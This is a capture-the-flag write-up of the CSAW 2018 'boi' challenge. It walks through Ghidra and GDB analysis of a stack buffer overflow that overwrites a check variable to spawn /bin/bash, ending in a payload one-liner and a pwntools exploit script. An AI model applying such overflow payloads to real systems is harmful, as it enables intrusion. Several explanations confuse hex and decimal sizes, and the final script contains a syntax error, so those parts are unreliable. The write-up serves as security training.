---
search:
  exclude: true
---
# CSAW 2018 Quals Boi

## Downloading the binary file 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/csaw18_boi/boi
    --2021-02-22 21:57:40--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/csaw18_boi/boi
    Resolving github.com (github.com)... 140.82.121.4
    Connecting to github.com (github.com)|140.82.121.4|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/csaw18_boi/boi [following]
    --2021-02-22 21:57:41--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/04-bof_variable/csaw18_boi/boi
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8792 (8.6K) [application/octet-stream]
    Saving to: ‘boi’
    
    boi                                     100%[===============================================================================>]   8.59K  --.-KB/s    in 0s
    
    2021-02-22 21:57:41 (31.4 MB/s) - ‘boi’ saved [8792/8792]
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → file boi
    boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → chmod +x boi
    
    

` ![]()

## Solution 

first things first, let's execute the binary to see what it does:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → ./boi
    Are you a big boiiiii??
    yes
    Tue 23 Feb 2021 08:53:13 AM CET
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → ./boi
    Are you a big boiiiii??
    no
    Tue 23 Feb 2021 08:53:17 AM CET
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → date
    Tue 23 Feb 2021 08:53:22 AM CET
    

it seems the binary checks for our input, and then executes a command, in this case it's 'date' let's use pwn to check the security of that binary:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → pwn checksec boi
    [*] '/home/nothing/binexp/2/boi'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    

here we see that this is a 64bit binary with a Stack Canary, and a non-executable stack (which are 2 binary mitigations). Let's take a look at it with ghidra:

![](1.png)

which gives us the following code for the main function:
    
    
    undefined8 main(void)
    
    {
      long in_FS_OFFSET;
      undefined8 local_38;
      undefined8 local_30;
      undefined4 local_28;
      int iStack36;
      undefined4 local_20;
      long local_10;
      
      local_10 = *(long *)(in_FS_OFFSET + 0x28);
      local_38 = 0;
      local_30 = 0;
      local_20 = 0;
      local_28 = 0;
      iStack36 = -0x21524111;
      puts("Are you a big boiiiii??");
      read(0,&local;_38,0x18);
      if (iStack36 == -0x350c4512) {
        run_cmd("/bin/bash");
      }
      else {
        run_cmd("/bin/date");
      }
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    
    

Now in this main function, we see that our text input gets put into the local_38 variable, however there is something else here, there is an if statement, that wants the iStack36 value to be equal to a certain hexadecimal value. if it is not equal to that hex value, it will print out the date like we saw earlier, if it is actually the correct hex value, it will run /bin/bash. The important thing to note here is that the binary scans for 18 bytes of our data, or 18 ascii characters.

Now if we look at what our iStack value is declared as we get the following:
    
    
    iStack36 = -0x21524111;
    
    
    
            0040067e c7 45 e4        MOV        dword ptr [RBP + local_28+0x4],0xdeadbeef
                     ef be ad de
    
    

and then later on when iStack36 gets compared the second value:
    
    
      if (iStack36 == -0x350c4512) {
        run_cmd("/bin/bash");
      }
    
    
            004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                     f3 ca
            004006ad 75 0c           JNZ        LAB_004006bb
            004006af bf 7c 07        MOV        EDI=>s_/bin/bash_0040077c,s_/bin/bash_0040077c   = "/bin/bash"
                     40 00
            004006b4 e8 6d ff        CALL       run_cmd                                          undefined run_cmd()
                     ff ff
    
    

so, iStack36 first gets assignd the 0xdeadbeef value, and then it gets compared to 0xcaf3baee. Now the next step is to look at the stack layout in ghidra, you can click on any variable where they are declared:

![](2.png)
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined main()
                 undefined         AL:1           
                 undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00400659(W), 
                                                                                                       004006ca(R)  
                 undefined4        Stack[-0x20]:4 local_20                                XREF[1]:     00400677(W)  
                 undefined8        Stack[-0x28]:8 local_28                                XREF[1,2]:   0040066f(W), 
                                                                                                       0040067e(W), 
                                                                                                       004006a5(R)  
                 undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
                 undefined8        Stack[-0x38]:8 local_38                                XREF[2]:     0040065f(W), 
                                                                                                       0040068f(*)  
                 undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
                 undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
                                 main                                            XREF[5]:     Entry Point(*), 
                                                                                              _start:0040054d(*), 
                                                                                              _start:0040054d(*), 004007b4, 
                                                                                              00400868(*)  
            00400641 55              PUSH       RBP
    
    

Now according to ghidra, our input (local_38) is stored at offset -0x38 and we see that is stored at offset -0x28 this means that theres is a 0x10 byte difference between the 2 values. 

Since we can write 0x18 bytes or characters, that measn we can fill up the 0x10 byte difference and overwrite other values, most importantly the value being checked (iStack36). So let's take a look at it from gdb-gef : 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → gdb ./boi
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from ./boi...
    (No debugging symbols found in ./boi)
    gef➤
    
    

Now from here, we set a breakpoint at *0x4006a5 because this is where 

![](3.png)
    
    
    gef➤  b *0x4006a5
    Breakpoint 1 at 0x4006a5
    
    gef➤  r
    Starting program: /home/nothing/binexp/2/boi
    Are you a big boiiiii??
    yes
    

Here we use b to set the breakpoint, and r to run the binary, put in our text, and we get this breakpoint output:
    
    
    Breakpoint 1, 0x00000000004006a5 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x4
    $rbx   : 0x0
    $rcx   : 0x00007ffff7edce8e  →  0x5a77fffff0003d48 ("H="?)
    $rdx   : 0x18
    $rsp   : 0x00007fffffffe0f0  →  0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"
    $rbp   : 0x00007fffffffe130  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x00007fffffffe100  →  0x000000000a736579 ("yes\n"?)
    $rdi   : 0x0
    $rip   : 0x00000000004006a5  →   mov eax, DWORD PTR [rbp-0x1c]
    $r8    : 0x18
    $r9    : 0x00007ffff7facbe0  →  0x00000000006026a0  →  0x0000000000000000
    $r10   : 0xfffffffffffff28b
    $r11   : 0x246
    $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0f0│+0x0000: 0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"   ← $rsp
    0x00007fffffffe0f8│+0x0008: 0x000000010040072d
    0x00007fffffffe100│+0x0010: 0x000000000a736579 ("yes\n"?)        ← $rsi
    0x00007fffffffe108│+0x0018: 0x0000000000000000
    0x00007fffffffe110│+0x0020: 0xdeadbeef00000000
    0x00007fffffffe118│+0x0028: 0x0000000000000000
    0x00007fffffffe120│+0x0030: 0x00007fffffffe220  →  0x0000000000000001
    0x00007fffffffe128│+0x0038: 0xa4430c55074e2b00
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x400698         mov    rsi, rax
         0x40069b         mov    edi, 0x0
         0x4006a0         call   0x400500 
    ●→   0x4006a5        mov    eax, DWORD PTR [rbp-0x1c]
         0x4006a8        cmp    eax, 0xcaf3baee
         0x4006ad        jne    0x4006bb 
         0x4006af        mov    edi, 0x40077c
         0x4006b4        call   0x400626 
         0x4006b9        jmp    0x4006c5 
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a5 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤search-pattern yes
    
    
    

now the thing is we can't just search-pattern the yes word we used as input, we need something more specific, so let's redo it:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → gdb ./boi
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from ./boi...
    (No debugging symbols found in ./boi)
    gef➤  b *0x4006a5
    Breakpoint 1 at 0x4006a5
    gef➤  r
    Starting program: /home/nothing/binexp/2/boi
    Are you a big boiiiii??
    11223344
    
    Breakpoint 1, 0x00000000004006a5 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x9
    $rbx   : 0x0
    $rcx   : 0x00007ffff7edce8e  →  0x5a77fffff0003d48 ("H="?)
    $rdx   : 0x18
    $rsp   : 0x00007fffffffe0f0  →  0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"
    $rbp   : 0x00007fffffffe130  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x00007fffffffe100  →  "11223344\n"
    $rdi   : 0x0
    $rip   : 0x00000000004006a5  →   mov eax, DWORD PTR [rbp-0x1c]
    $r8    : 0x18
    $r9    : 0x00007ffff7facbe0  →  0x00000000006026a0  →  0x0000000000000000
    $r10   : 0xfffffffffffff28b
    $r11   : 0x246
    $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0f0│+0x0000: 0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"   ← $rsp
    0x00007fffffffe0f8│+0x0008: 0x000000010040072d
    0x00007fffffffe100│+0x0010: "11223344\n"         ← $rsi
    0x00007fffffffe108│+0x0018: 0x000000000000000a
    0x00007fffffffe110│+0x0020: 0xdeadbeef00000000
    0x00007fffffffe118│+0x0028: 0x0000000000000000
    0x00007fffffffe120│+0x0030: 0x00007fffffffe220  →  0x0000000000000001
    0x00007fffffffe128│+0x0038: 0xd7f7b092c102bd00
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x400698         mov    rsi, rax
         0x40069b         mov    edi, 0x0
         0x4006a0         call   0x400500 
    ●→   0x4006a5        mov    eax, DWORD PTR [rbp-0x1c]
         0x4006a8        cmp    eax, 0xcaf3baee
         0x4006ad        jne    0x4006bb 
         0x4006af        mov    edi, 0x40077c
         0x4006b4        call   0x400626 
         0x4006b9        jmp    0x4006c5 
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a5 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤  search-pattern 11223344
    [+] Searching '11223344' in memory
    [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
      0x7fffffffe100 - 0x7fffffffe10a  →   "11223344\n"
    
    

Now from here we used the input '11223344' and gdb managed to find where it was located, so let's get more info on the **0x7fffffffe100** adress:
    
    
    gef➤  x/10g 0x7fffffffe100
    0x7fffffffe100: 0x3434333332323131      0xa
    
    **0x7fffffffe110: 0xdeadbeef00000000      0x0**
    
    0x7fffffffe120: 0x7fffffffe220  0xd7f7b092c102bd00
    0x7fffffffe130: 0x4006e0        0x7ffff7e14d0a
    0x7fffffffe140: 0x7fffffffe228  0x100000000
    

From that output you can see the 0xdeadbeef value appearing at the 10 bytes offset we mentionned earlier.
    
    
            0040067e c7 45 e4        MOV        dword ptr [RBP + local_28+0x4],0xdeadbeef
                     ef be ad de
    
    

Now from here we will use python to create a specific payload, since we know that our input 11223344 is 10 bytes away, we will give the input of 10 zeroes, +p32(0xcaf3baee). We need the hex address to be in 'least endian' (least significant byte first) so this means we will write caf3baee in reverse like this : ee ba f3 ca. That is because this is an ELF binary, we saw it at the beginning of this writeup, and because of how the elf will read in the data, so we have to pack it in the correct order to be read properly:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    →  python -c 'print "0"*0x10  + "\xee\xba\xf3\xca"' > input
    
    

now here you see that we create a file called 'input' that has 10 bytes worth of 0 characters, so essentially we have 10 zero characters and then afterwards we have the caf3baee hex value written in reverse, or in 'least endian'. We will use this input to feed into our binary file, and then we will see if we successfully managed to overwrite the data we wanted:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → gdb ./boi
    
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from ./boi...
    (No debugging symbols found in ./boi)
    
    gef➤  b *0x4006a5
    Breakpoint 1 at 0x4006a5
    
    gef➤  r < input
    Starting program: /home/nothing/binexp/2/boi < input
    Are you a big boiiiii??
    
    Breakpoint 1, 0x00000000004006a5 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x15
    $rbx   : 0x0
    $rcx   : 0x00007ffff7edce8e  →  0x5a77fffff0003d48 ("H="?)
    $rdx   : 0x18
    $rsp   : 0x00007fffffffe0f0  →  0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"
    $rbp   : 0x00007fffffffe130  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x00007fffffffe100  →  0x3030303030303030 ("00000000"?)
    $rdi   : 0x0
    $rip   : 0x00000000004006a5  →   mov eax, DWORD PTR [rbp-0x1c]
    $r8    : 0x18
    $r9    : 0x00007ffff7facbe0  →  0x00000000006026a0  →  0x0000000000000000
    $r10   : 0xfffffffffffff28b
    $r11   : 0x246
    $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0f0│+0x0000: 0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"   ← $rsp
    0x00007fffffffe0f8│+0x0008: 0x000000010040072d
    0x00007fffffffe100│+0x0010: 0x3030303030303030   ← $rsi
    0x00007fffffffe108│+0x0018: 0x3030303030303030
    0x00007fffffffe110│+0x0020: 0xdeadbe0acaf3baee
    0x00007fffffffe118│+0x0028: 0x0000000000000000
    0x00007fffffffe120│+0x0030: 0x00007fffffffe220  →  0x0000000000000001
    0x00007fffffffe128│+0x0038: 0xeea3ebadbb735f00
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x400698         mov    rsi, rax
         0x40069b         mov    edi, 0x0
         0x4006a0         call   0x400500 
    ●→   0x4006a5        mov    eax, DWORD PTR [rbp-0x1c]
         0x4006a8        cmp    eax, 0xcaf3baee
         0x4006ad        jne    0x4006bb 
         0x4006af        mov    edi, 0x40077c
         0x4006b4        call   0x400626 
         0x4006b9        jmp    0x4006c5 
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a5 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    
    gef➤  search-pattern 0000000000
    [+] Searching '0000000000' in memory
    [+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5e000-0x7ffff7fa8000), permission=r--
      0x7ffff7f7fd50 - 0x7ffff7f7fd60  →   "0000000000000000"
    [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
      0x7fffffffe100 - 0x7fffffffe10a  →   "0000000000[...]"
    
    gef➤  x/10g 0x7fffffffe100
    0x7fffffffe100: 0x3030303030303030      0x3030303030303030
    0x7fffffffe110: 0xdeadbe0acaf3baee      0x0
    0x7fffffffe120: 0x7fffffffe220  0xeea3ebadbb735f00
    0x7fffffffe130: 0x4006e0        0x7ffff7e14d0a
    0x7fffffffe140: 0x7fffffffe228  0x100000000
    
    
    

Here we can see at address 0x7fffffffe110 that the previous value of 0xdeadbeef got partially overwritten by our values caf3baee, with an offset of 8 hexadecimals, and for some reason we need to adjust the payload with only 4 hexadimals (from 10 to 14):
    
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [~/binexp/2]
    → python -c 'print "0"*0x10  + "\xee\xba\xf3\xca"'
    0000000000000000
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [~/binexp/2]
    → python -c 'print "0"*0x14  + "\xee\xba\xf3\xca"'
    00000000000000000000
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [~/binexp/2]
    → python -c 'print "0"*0x14  + "\xee\xba\xf3\xca"'  > input
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → gdb ./boi
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from ./boi...
    (No debugging symbols found in ./boi)
    gef➤  b *0x4006a5
    Breakpoint 1 at 0x4006a5
    gef➤  r < input
    Starting program: /home/nothing/binexp/2/boi < input
    Are you a big boiiiii??
    
    Breakpoint 1, 0x00000000004006a5 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x18
    $rbx   : 0x0
    $rcx   : 0x00007ffff7edce8e  →  0x5a77fffff0003d48 ("H="?)
    $rdx   : 0x18
    $rsp   : 0x00007fffffffe0f0  →  0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"
    $rbp   : 0x00007fffffffe130  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x00007fffffffe100  →  0x3030303030303030 ("00000000"?)
    $rdi   : 0x0
    $rip   : 0x00000000004006a5  →   mov eax, DWORD PTR [rbp-0x1c]
    $r8    : 0x18
    $r9    : 0x00007ffff7facbe0  →  0x00000000006026a0  →  0x0000000000000000
    $r10   : 0xfffffffffffff28b
    $r11   : 0x246
    $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0f0│+0x0000: 0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"   ← $rsp
    0x00007fffffffe0f8│+0x0008: 0x000000010040072d
    0x00007fffffffe100│+0x0010: 0x3030303030303030   ← $rsi
    0x00007fffffffe108│+0x0018: 0x3030303030303030
    0x00007fffffffe110│+0x0020: 0xcaf3baee30303030
    0x00007fffffffe118│+0x0028: 0x0000000000000000
    0x00007fffffffe120│+0x0030: 0x00007fffffffe220  →  0x0000000000000001
    0x00007fffffffe128│+0x0038: 0xeacf1d34e3c42300
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x400698         mov    rsi, rax
         0x40069b         mov    edi, 0x0
         0x4006a0         call   0x400500 
    ●→   0x4006a5        mov    eax, DWORD PTR [rbp-0x1c]
         0x4006a8        cmp    eax, 0xcaf3baee
         0x4006ad        jne    0x4006bb 
         0x4006af        mov    edi, 0x40077c
         0x4006b4        call   0x400626 
         0x4006b9        jmp    0x4006c5 
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a5 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤  search-pattern 00000000000000
    [+] Searching '00000000000000' in memory
    [+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5e000-0x7ffff7fa8000), permission=r--
      0x7ffff7f7fd50 - 0x7ffff7f7fd60  →   "0000000000000000"
    [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
      0x7fffffffe100 - 0x7fffffffe10e  →   "00000000000000[...]"
    gef➤  x/10g 0x7fffffffe100
    0x7fffffffe100: 0x3030303030303030      0x3030303030303030
    0x7fffffffe110: 0xcaf3baee30303030      0x0
    0x7fffffffe120: 0x7fffffffe220  0xeacf1d34e3c42300
    0x7fffffffe130: 0x4006e0        0x7ffff7e14d0a
    0x7fffffffe140: 0x7fffffffe228  0x100000000
    
    

and this time we successfully overwrote the 0xdeadbeef value with our own 0xcaf3baee value! so when we continue onto the cmp instruction related to the if statement, we can see that we actually pass the check correctly, we need to se the next breakpoint at 0x4006a8 because this is where the CMP assembly instruction is:

![](4.png)
    
    
            004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                     f3 ca
    
            004006ad 75 0c           JNZ        LAB_004006bb
            004006af bf 7c 07        MOV        EDI=>s_/bin/bash_0040077c,s_/bin/bash_0040077c   = "/bin/bash"
                     40 00
            004006b4 e8 6d ff        CALL       run_cmd                                          undefined run_cmd()
                     ff ff
    
    
    
    
    gef➤  b *0x4006a8
    Breakpoint 2 at 0x4006a8
    gef➤  c
    Continuing.
    
    Breakpoint 2, 0x00000000004006a8 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0xcaf3baee
    $rbx   : 0x0
    $rcx   : 0x00007ffff7edce8e  →  0x5a77fffff0003d48 ("H="?)
    $rdx   : 0x18
    $rsp   : 0x00007fffffffe0f0  →  0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"
    $rbp   : 0x00007fffffffe130  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
    $rsi   : 0x00007fffffffe100  →  0x3030303030303030 ("00000000"?)
    $rdi   : 0x0
    $rip   : 0x00000000004006a8  →   cmp eax, 0xcaf3baee
    $r8    : 0x18
    $r9    : 0x00007ffff7facbe0  →  0x00000000006026a0  →  0x0000000000000000
    $r10   : 0xfffffffffffff28b
    $r11   : 0x246
    $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0f0│+0x0000: 0x00007fffffffe228  →  0x00007fffffffe500  →  "/home/nothing/binexp/2/boi"   ← $rsp
    0x00007fffffffe0f8│+0x0008: 0x000000010040072d
    0x00007fffffffe100│+0x0010: 0x3030303030303030   ← $rsi
    0x00007fffffffe108│+0x0018: 0x3030303030303030
    0x00007fffffffe110│+0x0020: 0xcaf3baee30303030
    0x00007fffffffe118│+0x0028: 0x0000000000000000
    0x00007fffffffe120│+0x0030: 0x00007fffffffe220  →  0x0000000000000001
    0x00007fffffffe128│+0x0038: 0xeacf1d34e3c42300
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x40069b         mov    edi, 0x0
         0x4006a0         call   0x400500 
    ●    0x4006a5        mov    eax, DWORD PTR [rbp-0x1c]
    ●→   0x4006a8        cmp    eax, 0xcaf3baee
         0x4006ad        jne    0x4006bb 
         0x4006af        mov    edi, 0x40077c
         0x4006b4        call   0x400626 
         0x4006b9        jmp    0x4006c5 
         0x4006bb        mov    edi, 0x400786
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "boi", stopped 0x4006a8 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4006a8 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    gef➤
    
    

Now from here we see the cmp value is comparing the eax register to the value 0xcaf3baee, so let's check what is inside eax:
    
    
    gef➤  p $eax
    $1 = 0xcaf3baee
    
    

So this means we should successfully pass the cmp instruction because both values are equal to 0xcaf3baee, so let's use python's pwntools to write an exploit to solve the challenge:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → ls
    boi  input
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → vim exploit.py
    
    
    
    
    #First, import the pwntools library
    from pwn import *
    
    #then set the target as the ./boi process
    target = process ('./boi')
    
    #then create the 14 0 bytes and little endian caf3baee payload
    payload = "0"*0x14 + + "\xee\xba\xf3\xca"
    
    # send the payload to the process
    target.send(payload)
    
    #and then drop into a shell to view the result
    target.interactive()
    
    

now let's test it:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [~/binexp/2]
    → python3 exploit.py
    [+] Starting local process './boi': pid 9071
    [*] Switching to interactive mode
    Are you a big boiiiii??
    $ id
